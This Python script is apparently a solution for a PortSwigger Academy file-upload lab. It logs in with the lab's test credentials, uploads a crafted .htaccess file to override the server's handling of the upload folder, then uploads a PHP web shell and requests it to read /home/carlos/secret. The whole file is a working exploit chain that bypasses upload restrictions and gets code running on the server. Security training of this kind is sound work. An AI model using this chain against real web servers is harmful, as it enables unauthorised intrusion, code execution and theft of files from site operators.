import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def get_session_cookie_and_csrf_token(url):
    path = "/login"
    r = requests.get(url + path, verify=False, proxies=proxies)
    session_cookie = r.cookies.get_dict()['session']
    soup = BeautifulSoup(r.text, 'html.parser')
    inputs = soup.findAll("input")
    csrf_token = re.search(r"[a-z,A-Z,0-9]{32}", str(inputs))
    return session_cookie,csrf_token.group(0)


def get_authorized_session_cookie_and_csrf_token(url, session_cookie, csrf_token):
    path = "/login"
    cookies = {'session' : session_cookie}
    params = {'csrf' : csrf_token , 'username' : 'wiener' , 'password' : 'peter'}
    r = requests.post(url + path, cookies=cookies, data=params, allow_redirects=False, verify=False, proxies=proxies)
    authorized_session_cookie = r.cookies.get_dict()['session']
    ################################################################
    path = "/my-account"
    cookies = {'session' : authorized_session_cookie}
    r = requests.get(url + path, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    inputs = soup.findAll("input")
    csrf_token = re.search(r"[a-z,A-Z,0-9]{32}", str(inputs))
    return authorized_session_cookie,csrf_token.group(0)


def do_htaccess_upload(url, authorized_session_cookie, csrf_token):
    path = "/my-account/avatar"
    cookies = {'session' : authorized_session_cookie}
    params = {'csrf' : csrf_token , 'user' : 'wiener'}
    files = {'avatar' : ('.htaccess', open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\.htaccess", "rb"))}
    r = requests.post(url + path, cookies=cookies, data=params, files=files, verify=False, proxies=proxies)
    if r.status_code == 200 and "has been uploaded" in r.text:
        return True
    else:
        return False


def do_php_upload(url, authorized_session_cookie, csrf_token):
    path = "/my-account/avatar"
    cookies = {'session' : authorized_session_cookie}
    params = {'csrf' : csrf_token, 'user' : 'wiener'}
    files = {'avatar' : ('shell-lab04.php5', open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\shell-lab04.php5", "rb"))}
    r= requests.post(url + path, cookies=cookies, data=params, files=files, verify=False, proxies=proxies)
    if r.status_code == 200 and "has been uploaded" in r.text:
        return True
    else:
        return False


def get_secret(url):
    path = "/files/avatars/shell-lab04.php5"
    r = requests.get(url + path, verify=False, proxies=proxies)
    return r.text


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Testing for a file upload vulnerability for logged-in users bypassing upload restriction with .htaccess file")
    session_cookie,csrf_token = get_session_cookie_and_csrf_token(url)
    print("[+] Session cookie {0} and csrf_token {1} needed for the next POST request (/login)\n".format(session_cookie, csrf_token))
    print("[+] POST request as wiener (password 'peter') and retrieval of authenticated session cookie and csrf token")
    authorized_session_cookie,csrf_token = get_authorized_session_cookie_and_csrf_token(url,session_cookie,csrf_token)
    print("[+] Authorized session cookie is {0} and csrf token from /login page is {1}\n".format(authorized_session_cookie, csrf_token))
    print("[+] Proceding now to upload a special .htaccess file needed to override the default behavior of the remote web server for the upload folder")
    htaccess_upload = do_htaccess_upload(url, authorized_session_cookie, csrf_token)
    if not htaccess_upload:
        print("[-] Upload failed")
        sys.exit(-1)
    print("[+] Upload succeded!!")
    php_upload = do_php_upload(url, authorized_session_cookie, csrf_token)
    if not php_upload:
        print("[-] Upload failed")
        sys.exit(-1)
    print("[+] Upload succeded!!")
    secret = get_secret(url)
    print("[+] Invoking now the .php file and retrieving the content of the file /home/carlos/secret which is %s" % secret)




if __name__ == "__main__":
    main()